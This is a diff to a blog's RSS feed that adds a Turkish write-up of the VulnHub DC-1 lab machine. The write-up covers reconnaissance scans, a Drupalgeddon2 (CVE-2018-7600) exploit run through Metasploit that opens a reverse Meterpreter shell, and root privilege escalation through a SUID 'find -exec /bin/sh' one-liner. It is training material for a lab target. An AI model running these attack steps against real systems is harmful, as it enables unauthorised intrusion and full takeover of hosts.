@@ -5,8 +5,315 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Fri, 25 Sep 2020 20:01:07 +0300</lastBuildDate>
+        <lastBuildDate>Sat, 26 Sep 2020 15:05:32 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>VULNHUB DC-1 Write Up</title>
+            <link>https://barcode91.github.io/posts/2020/09/vulnhub-dc-1-write-up/</link>
+            <pubDate>Sat, 26 Sep 2020 15:05:32 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-dc-1-write-up/</guid>
+            <description>Merhaba, VULNHUB &amp;lsquo;da yer alan DC-1 adlı makinanın çözümüyle karşınızdayım. Keyifli okumalar&amp;hellip;
+1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
+netdiscover -i eth1  İp adresi tespit edildikten sonra nmap ile makinenin tüm portları taranır. Açık portlarda çalışan servisler tespit edilir.
+sudo nmap -sV -sC -p- 192.168.56.107  80 portunda çalışan web servisine tarayıcından istek atılır.</description>
+            <content type="html"><![CDATA[<p>Merhaba, <a href="https://www.vulnhub.com/entry/dc-1,292/">VULNHUB</a> &lsquo;da yer alan DC-1 adlı makinanın çözümüyle karşınızdayım. Keyifli okumalar&hellip;</p>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
+</code></pre></div>
+    <img src="/images/vulnhub/dc1/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>İp adresi tespit edildikten sonra nmap ile makinenin tüm portları taranır. Açık portlarda çalışan servisler tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.107
+</code></pre></div>
+    <img src="/images/vulnhub/dc1/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>80 portunda çalışan web servisine tarayıcından istek atılır. Ayrıca http-generator  bilgisinde Drupal 7 yazmaktadır. Google ile yapılan aramada CMS yazılımı olduğu görülmektedir.</p>
+
+    <img src="/images/vulnhub/dc1/webpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Web dizin taraması gerçekleştirilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.107 -w /usr/share/wordlists/dirb/common.txt
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Gobuster v3.0.1
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://192.168.56.107
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
+<span style="color:#f92672">===============================================================</span>
+2020/09/24 10:03:45 Starting gobuster
+<span style="color:#f92672">===============================================================</span>
+/.history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.hta <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.bash_history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.git/HEAD <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.forward <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.cvsignore <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.cvs <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.config <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.cache <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.bashrc <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.perf <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.passwd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.profile <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.mysql_history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.rhosts <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.listings <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.svn/entries <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.svn <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.subversion <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.ssh <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.listing <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.sh_history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.web <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.swf <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/0 <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/admin <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/Admin <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/ADMIN <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/batch <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/cgi-bin/ <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/Entries <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/includes <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/index.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/install.mysql <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/install.pgsql <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/LICENSE <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/misc <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/modules <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/node <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/profiles <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/README <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/robots <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/robots.txt <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/Root <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/scripts <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/search <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/Search <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/sites <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/themes <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+/user <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/web.config <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/xmlrpc.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+2020/09/24 10:13:18 Finished
+<span style="color:#f92672">===============================================================</span>
+</code></pre></div><p>İlk olarak robots.txt dosyasına göz gezdirilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">User-agent: *
+Crawl-delay: 10
+# Directories
+Disallow: /includes/
+Disallow: /misc/
+Disallow: /modules/
+Disallow: /profiles/
+Disallow: /scripts/
+Disallow: /themes/
+# Files
+Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+Disallow: /INSTALL.pgsql.txt
+Disallow: /INSTALL.sqlite.txt
+Disallow: /install.php
+Disallow: /INSTALL.txt
+Disallow: /LICENSE.txt
+Disallow: /MAINTAINERS.txt
+Disallow: /update.php
+Disallow: /UPGRADE.txt
+Disallow: /xmlrpc.php
+# Paths (clean URLs)
+Disallow: /admin/
+Disallow: /comment/reply/
+Disallow: /filter/tips/
+Disallow: /node/add/
+Disallow: /search/
+Disallow: /user/register/
+Disallow: /user/password/
+Disallow: /user/login/
+Disallow: /user/logout/
+# Paths (no clean URLs)
+Disallow: /?q=admin/
+Disallow: /?q=comment/reply/
+Disallow: /?q=filter/tips/
+Disallow: /?q=node/add/
+Disallow: /?q=search/
+Disallow: /?q=user/password/
+Disallow: /?q=user/register/
+Disallow: /?q=user/login/
+Disallow: /?q=user/logout/
+</code></pre></div><p><strong>/?p=</strong> parametresi LFI, RFI açıklarının olabileceğini düşündürmektedir. Yapılan denemelerde başarılı olunamamıştır. <em><strong>web.config</strong></em> dikkat çekmektedir. İstek atıldığında xml verisi görülmektedir. LFI ve RFI gibi saldırıları önlemek için epey bir önlem alındığı görülmektedir. 😔</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;configuration&gt;</span>
+<span style="color:#f92672">&lt;system.webServer&gt;</span>
+<span style="color:#75715e">&lt;!--
+</span><span style="color:#75715e"> Don&#39;t show directory listings for URLs which map to a directory. 
+</span><span style="color:#75715e">--&gt;</span>
+<span style="color:#f92672">&lt;directoryBrowse</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;rewrite&gt;</span>
+<span style="color:#f92672">&lt;rules&gt;</span>
+<span style="color:#f92672">&lt;rule</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Protect files and directories from prying eyes&#34;</span> <span style="color:#a6e22e">stopProcessing=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;match</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)$|file*|Repository|Root|Tag|Template)$&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;CustomResponse&#34;</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;403&#34;</span> <span style="color:#a6e22e">subStatusCode=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">statusReason=</span><span style="color:#e6db74">&#34;Forbidden&#34;</span> <span style="color:#a6e22e">statusDescription=</span><span style="color:#e6db74">&#34;Access is forbidden.&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;/rule&gt;</span>
+<span style="color:#f92672">&lt;rule</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Force simple error message for requests for non-existent favicon.ico&#34;</span> <span style="color:#a6e22e">stopProcessing=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;match</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;favicon\.ico&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;CustomResponse&#34;</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;404&#34;</span> <span style="color:#a6e22e">subStatusCode=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">statusReason=</span><span style="color:#e6db74">&#34;File Not Found&#34;</span> <span style="color:#a6e22e">statusDescription=</span><span style="color:#e6db74">&#34;The requested file favicon.ico was not found&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;conditions&gt;</span>
+<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{REQUEST_FILENAME}&#34;</span> <span style="color:#a6e22e">matchType=</span><span style="color:#e6db74">&#34;IsFile&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;/conditions&gt;</span>
+<span style="color:#f92672">&lt;/rule&gt;</span>
+<span style="color:#75715e">&lt;!--
+</span><span style="color:#75715e"> Rewrite URLs of the form &#39;x&#39; to the form &#39;index.php?q=x&#39;. 
+</span><span style="color:#75715e">--&gt;</span>
+<span style="color:#f92672">&lt;rule</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Short URLs&#34;</span> <span style="color:#a6e22e">stopProcessing=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;match</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;^(.*)$&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;conditions&gt;</span>
+<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{REQUEST_FILENAME}&#34;</span> <span style="color:#a6e22e">matchType=</span><span style="color:#e6db74">&#34;IsFile&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{REQUEST_FILENAME}&#34;</span> <span style="color:#a6e22e">matchType=</span><span style="color:#e6db74">&#34;IsDirectory&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{URL}&#34;</span> <span style="color:#a6e22e">pattern=</span><span style="color:#e6db74">&#34;^/favicon.ico$&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;/conditions&gt;</span>
+<span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;Rewrite&#34;</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;index.php?q={R:1}&#34;</span> <span style="color:#a6e22e">appendQueryString=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;/rule&gt;</span>
+<span style="color:#f92672">&lt;/rules&gt;</span>
+<span style="color:#f92672">&lt;/rewrite&gt;</span>
+<span style="color:#f92672">&lt;httpErrors&gt;</span>
+<span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;404&#34;</span> <span style="color:#a6e22e">subStatusCode=</span><span style="color:#e6db74">&#34;-1&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;error</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;404&#34;</span> <span style="color:#a6e22e">prefixLanguageFilePath=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;/index.php&#34;</span> <span style="color:#a6e22e">responseMode=</span><span style="color:#e6db74">&#34;ExecuteURL&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;/httpErrors&gt;</span>
+<span style="color:#f92672">&lt;defaultDocument&gt;</span>
+<span style="color:#75715e">&lt;!-- Set the default document --&gt;</span>
+<span style="color:#f92672">&lt;files&gt;</span>
+<span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;index.php&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;index.php&#34;</span><span style="color:#f92672">/&gt;</span>
+<span style="color:#f92672">&lt;/files&gt;</span>
+<span style="color:#f92672">&lt;/defaultDocument&gt;</span>
+<span style="color:#f92672">&lt;/system.webServer&gt;</span>
+<span style="color:#f92672">&lt;/configuration&gt;</span>
+</code></pre></div><p>Google&rsquo;da yapılan aramalarda CMS sürümünün eski olduğu tespit edilmiştir. Yapılan aramalarda <em>CVE-2018-7600</em> kodlu &lsquo;Drupalgeddon2&rsquo; adında  RCE (Remote Code Execution) exploiti tespit edilir.(Exploitdb de yer alan exploit indirilip kullanılabilmektedir. Ben burada metasploit üzerinde exploit etme işlemi gerçekleştirdim.)</p>
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -q
+</code></pre></div><p>Metasploit açılır ve search komutu ile dropal ile ilgili arama gerçekleştirilir. Aynı exploit metasploit içerisinde yer almaktadır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; search drupal
+
+Matching Modules
+<span style="color:#f92672">================</span>
+
+   <span style="color:#75715e">#  Name                                           Disclosure Date  Rank       Check  Description</span>
+   -  ----                                           ---------------  ----       -----  -----------
+   <span style="color:#ae81ff">0</span>  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
+   <span style="color:#ae81ff">1</span>  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
+   <span style="color:#ae81ff">2</span>  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
+   <span style="color:#ae81ff">3</span>  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
+   <span style="color:#ae81ff">4</span>  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon <span style="color:#ae81ff">2</span> Forms API Property Injection
+   <span style="color:#ae81ff">5</span>  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
+   <span style="color:#ae81ff">6</span>  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize<span style="color:#f92672">()</span> RCE
+   <span style="color:#ae81ff">7</span>  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">options <span style="color:#75715e">#exploit kullanımı için gerekli parametler görüntülenir</span>
+set paramatre değer <span style="color:#75715e">#parametreye değer set edilir.</span>
+exploit/run  <span style="color:#75715e">#exploit çalıştırılır.</span>
+</code></pre></div><p>Dördüncü sırada yer alan exploit seçilir gerekli parametler ayarlamalar yapıldıktından sonra exploit/run komutu ile çalıştırılır ve meterpreter oturumu elde edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use <span style="color:#ae81ff">4</span>
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/drupal_drupalgeddon2<span style="color:#f92672">)</span> &gt; set RHOSTS 192.168.56.107
+RHOSTS <span style="color:#f92672">=</span>&gt; 192.168.56.107
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/drupal_drupalgeddon2<span style="color:#f92672">)</span> &gt; exploit
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.56.105:4444 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">38288</span> bytes<span style="color:#f92672">)</span> to 192.168.56.107
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.56.105:4444 -&gt; 192.168.56.107:40386<span style="color:#f92672">)</span> at 2020-09-24 12:16:50 -0500
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid
+Server username: www-data <span style="color:#f92672">(</span>33<span style="color:#f92672">)</span>
+
+meterpreter &gt; ls
+Listing: /var/www
+<span style="color:#f92672">=================</span>
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100644/rw-r--r--  <span style="color:#ae81ff">174</span>    fil   2013-11-20 14:45:59 -0600  .gitignore
+100644/rw-r--r--  <span style="color:#ae81ff">5767</span>   fil   2013-11-20 14:45:59 -0600  .htaccess
+100644/rw-r--r--  <span style="color:#ae81ff">1481</span>   fil   2013-11-20 14:45:59 -0600  COPYRIGHT.txt
+100644/rw-r--r--  <span style="color:#ae81ff">1451</span>   fil   2013-11-20 14:45:59 -0600  INSTALL.mysql.txt
+100644/rw-r--r--  <span style="color:#ae81ff">1874</span>   fil   2013-11-20 14:45:59 -0600  INSTALL.pgsql.txt
+100644/rw-r--r--  <span style="color:#ae81ff">1298</span>   fil   2013-11-20 14:45:59 -0600  INSTALL.sqlite.txt
+100644/rw-r--r--  <span style="color:#ae81ff">17861</span>  fil   2013-11-20 14:45:59 -0600  INSTALL.txt
+100755/rwxr-xr-x  <span style="color:#ae81ff">18092</span>  fil   2013-11-01 05:14:15 -0500  LICENSE.txt
+100644/rw-r--r--  <span style="color:#ae81ff">8191</span>   fil   2013-11-20 14:45:59 -0600  MAINTAINERS.txt
+100644/rw-r--r--  <span style="color:#ae81ff">5376</span>   fil   2013-11-20 14:45:59 -0600  README.txt
+100644/rw-r--r--  <span style="color:#ae81ff">9642</span>   fil   2013-11-20 14:45:59 -0600  UPGRADE.txt
+100644/rw-r--r--  <span style="color:#ae81ff">6604</span>   fil   2013-11-20 14:45:59 -0600  authorize.php
+100644/rw-r--r--  <span style="color:#ae81ff">720</span>    fil   2013-11-20 14:45:59 -0600  cron.php
+100644/rw-r--r--  <span style="color:#ae81ff">52</span>     fil   2019-02-19 07:20:46 -0600  flag1.txt
+40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  includes
+100644/rw-r--r--  <span style="color:#ae81ff">529</span>    fil   2013-11-20 14:45:59 -0600  index.php
+100644/rw-r--r--  <span style="color:#ae81ff">703</span>    fil   2013-11-20 14:45:59 -0600  install.php
+40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  misc
+40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  modules
+40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  profiles
+100644/rw-r--r--  <span style="color:#ae81ff">1561</span>   fil   2013-11-20 14:45:59 -0600  robots.txt
+40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  scripts
+40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  sites
+40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  themes
+100644/rw-r--r--  <span style="color:#ae81ff">19941</span>  fil   2013-11-20 14:45:59 -0600  update.php
+100644/rw-r--r--  <span style="color:#ae81ff">2178</span>   fil   2013-11-20 14:45:59 -0600  web.config
+100644/rw-r--r--  <span style="color:#ae81ff">417</span>    fil   2013-11-20 14:45:59 -0600  xmlrpc.php
+</code></pre></div><p><code>shell</code> komutu ile normal oturuma geçilir. Daha sonra interaktif oturum için python pty modulü kullanılır. Daha sonra flag1.txt okunur. <em>(Meterpreter oturumu ile devam edilebilir ben kullanmayı sevmediğimden normal shelle geçiyorum.)</em></p>
+
+    <img src="/images/vulnhub/dc1/flag1.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Home dizinine geçilerek diğer kullanılar tespit edilir. Flag4 adında bir kullanıcı dizini yer almaktadır. Dizin yetkilerine bakıldığında tüm kullanıcılar için okuma ve çalıştırma yetkileri bulunmaktadır.</p>
+
+    <img src="/images/vulnhub/dc1/flag43.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Dizin içerisinde yer alan flag4.txt okunur.</p>
+
+    <img src="/images/vulnhub/dc1/flag44.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>Sistem suid biti aktif olan dosyalar için arama yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@DC-1:/$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+/bin/umount
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/bin/find
+/usr/sbin/exim4
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/sbin/mount.nfs
+www-data@DC-1:/$ 
+</code></pre></div><p>find komutu dikkat çekmektedir. find komutu -exec parametresi ile komut çalıştırabilmektedir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . -exec /bin/sh <span style="color:#ae81ff">\;</span> -quit
+</code></pre></div><p>Komut çalıştırıldıktan sonra www-data kullanıcısının efektif user id değeri ve grubunun root olarak set edildiği görülmektedir. Daha sonra /root dizinine gidilerek flag edeği okunarak makina çözümlemesi tamamlanır.</p>
+
+    <img src="/images/vulnhub/dc1/flagson.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>VULN KB VULN:2 Write Up</title>
